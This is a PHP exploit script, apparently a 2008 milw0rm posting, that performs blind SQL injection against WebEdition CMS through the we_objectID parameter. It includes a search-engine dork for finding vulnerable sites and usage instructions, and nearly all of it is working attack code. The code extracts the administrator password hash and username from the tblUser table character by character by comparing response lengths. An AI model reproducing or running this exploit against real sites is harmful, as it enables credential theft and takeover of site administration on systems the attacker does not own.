<?php
ini_set("max_execution_time",0);
print_r('
###############################################################
#
#           WebEdition CMS - Blind SQL Injection Exploit     
#                                                             
#      Vulnerability discovered by: Lidloses_Auge             
#      Exploit coded by:            Lidloses_Auge
#      Special Greetz to:           H4x0r007 (who sent me a vulnerable Page)
#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco,
#                                   GPM, Free-Hack, Ciphercrew, h4ck-y0u
#      Date:                        20.08.2008
#
###############################################################
#                                                             
#      Dork:        inurl:we_objectID=
#      Admin Panel: [Target]/webEdition/
#      Usage:       php '.$argv[0].' [Target] [Userid]
#      Example for http://www.site.com/en/****.php?we_objectID=21
#      => php '.$argv[0].' http://www.site.com/en/****.php?we_objectID=21 1
#                                                             
###############################################################
');
if ($argc > 1) {
$url = $argv[1];
if ($argc < 3) {
$userid = 1;
} else {
$userid = $argv[2];
}
$r = strlen(file_get_contents($url."'and+1=1/*"));
echo "\nExploiting:\n";
$w = strlen(file_get_contents($url."'and+1=0/*"));
$t = abs((100-($w/$r*100)));
echo "Password: ";
for ($j = 1; $j <= 32; $j++) {
   for ($i = 46; $i <= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."'and+ascii(substring((select+passwd+from+tblUser+where+id=".$userid."+limit+0,1),".$j.",1))%3E".$i."/*"));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."'and+ascii(substring((select+passwd+from+tblUser+where+id=".$userid."+limit+0,1),".$j.",1))%3E".($i-1)."/*"));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 102;
      }
   }
}
echo "\nUsername: ";
for ($i=1; $i <= 30; $i++) {
$laenge = strlen(file_get_contents($url."'and+ascii(substring((select+username+from+tblUser+where+id=".$userid."+limit+0,1),".$i.",1))!=0/*"));
   if (abs((100-($laenge/$r*100))) > $t-1) {
      $count = $i;
      $i = 30;
   }
}
for ($j = 1; $j < $count; $j++) {
   for ($i = 46; $i <= 122; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."'and+ascii(substring((select+username+from+tblUser+where+id=".$userid."+limit+0,1),".$j.",1))%3E".$i."/*"));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."'and+ascii(substring((select+username+from+tblUser+where+id=".$userid."+limit+0,1),".$j.",1))%3E".($i-1)."/*"));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 122;
      }
   }
}

} else {
echo "\nExploiting failed: Not enough arguments?\n";
}
?>

# milw0rm.com [2008-08-20]
